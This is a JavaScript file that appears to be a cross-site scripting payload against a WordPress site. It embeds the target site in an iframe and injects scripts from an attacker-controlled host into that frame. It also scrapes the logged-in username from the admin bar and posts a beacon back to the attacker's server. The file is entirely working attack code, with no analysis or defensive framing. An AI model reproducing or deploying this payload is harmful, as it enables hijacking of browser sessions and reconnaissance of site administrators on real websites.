var strMyPosition="XSS";

//--------------------------------------------index page-----------------------------------------------------------------------
function inPageIndex()
{   //test is login
    var strUsername="";
    var strSite=Common.getTargetHost();
    if($("#wpadminbar").length>0)
    {   //login already
        strUsername=$("#wpadminbar").find("a.ab-item[href='http://localhost/wp-admin/profile.php'][aria-haspopup='true']").text();
    }
    else
    {   //not login
    }
    $.ajax
    (
        {
            type:"post",
            url:Common.getJSHost()+"visit-logs/add2"
        }
    );
}
//set position for iframe
function setPositionIndex()
{
    setPosition("index");
    Common.callBackAfterJSLoad("idScriptCommon",Common.getJSHost()+"zfirst/js/common.js",null,null,false,window.frames[0].document);
}
//-------------------------------------------------------------------------------------------------------------------

//add changable iframe
function addIFrameChangable()
{
    var $body=$("body");
    if($body.length===0)
    {
        throw "can not get body element";
    }
    //load home page and inject xss
    $body.append("<iframe id=\"idIFrameChangable\" src=\""+Common.getTargetHost()+"\" width=\"100%\" height=\"50%\"></iframe>");
    $("#idIFrameChangable").load
    (
        function()
        {
            console.log("load index frame success");
            //$(window.frames[0].document).find("head").append("<script src=\""+Common.getJSHost()+"zfirst/js/xss_index.js\"></script>");
            Common.callBackAfterJSLoad("idScriptXSS",Common.getJSHost()+"zfirst/js/xss.js",testIFrameXSS,setPositionIndex,false,window.frames[0].document);
        }
    );
}

//test for xss for iframe
function testIFrameXSS()
{
    var bReturn=false;
    if(typeof(window.frames[0].window.mainJSFunctionEntry)!=="undefined")
    {
        bReturn=true;
    }
    return bReturn;
}
//set position
function setPosition(strPosition)
{
    window.frames[0].window.strMyPosition=strPosition;
}


//judge change frame or post
function addIFrameOrPost()
{
    if(strMyPosition==="XSS")
    {   //XSS
        addIFrameChangable();
    }
    else if(strMyPosition==="index")
    {   //index
        inPageIndex();
    }
    else
    {
        throw "unrecongnized position:"+position;
    }
}

//test for jquery
function testJQuery()
{
    var bReturn=false;
    if(typeof($)!=="undefined")
    {
        bReturn=true;
    }
    return bReturn;
}

//main js function entry
function mainJSFunctionEntry()
{
    try
    {
        //check if jquery is useable
        if (!testJQuery())
        {
            Common.callBackAfterJSLoad("idScriptJQuery","http://ajax.microsoft.com/ajax/jquery/jquery-2.1.4.min.js", testJQuery, addIFrameOrPost,true,document);
        }
        else
        {
            addIFrameOrPost();
        }
    }
    catch(e)
    {
        console.log("error in mainJSFunctionEntry:"+e);
    }
}
